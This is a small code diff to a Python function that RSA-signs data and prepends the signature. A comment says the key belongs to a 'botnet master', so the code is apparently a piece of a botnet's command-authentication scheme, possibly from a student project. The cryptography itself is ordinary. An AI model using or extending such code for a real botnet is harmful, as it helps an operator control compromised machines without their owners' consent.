@@ -5,22 +5,16 @@ from Crypto.Signature import PKCS1_v1_5
 
 def sign_file(f):  
   #TODO: 
-  # - Determine acceptable key size (performance vs security)
-  # - Determine whether or not the DER vs PEM (if we need to encrypt key with passphrase
-  #   then it must be PEM.
-  # - Determine correct signature module (i.e. PKCS1_v1_5 vs ...?)
   # - Need a nonce for freshness ***
-  # - Should we harcode the key or re-generate a new one each time the master runs this py file? **** 
-
-  # Import the master key that only the botnet master has access too
+  
+  # Import the master key that only the botnet master has access to
   masterkey = RSA.importKey(open('masterkey.pem', 'rb').read())
   
   # Create the hash that will be signed and pre-pended to message
   h = SHA256.new(f)
   signer = PKCS1_v1_5.new(masterkey)
   signature = signer.sign(h)
-  print(len(signature))
-  
+
   return signature + f
 
 
